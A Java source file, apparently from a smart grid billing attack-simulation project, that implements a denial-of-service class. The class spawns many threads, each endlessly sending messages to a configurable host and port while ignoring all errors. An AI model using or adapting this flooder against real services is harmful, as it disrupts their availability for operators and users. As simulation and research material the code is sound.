package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.socket.SocketClient;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Created by ydai on 18/10/17.
 */
@AllArgsConstructor
@Slf4j
public class Dos {

    private int threadNumber;

    private String host;
    private int portNumber;

    public void attack() {
        log.info("Start dos attack,  ");
        for (int i = 0; i < threadNumber; i++) {
            DdosThread thread = new DdosThread(host, portNumber);
            thread.start();
        }
    }

    private class DdosThread extends Thread {
        private AtomicBoolean running = new AtomicBoolean(true);

        private SocketClient socketClient;

        public DdosThread(String host, int portNumber) {
            socketClient = new SocketClient(host, portNumber);
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    socketClient.sendToPort(null);
                } catch (Exception e) {

                }


            }
        }
    }
}
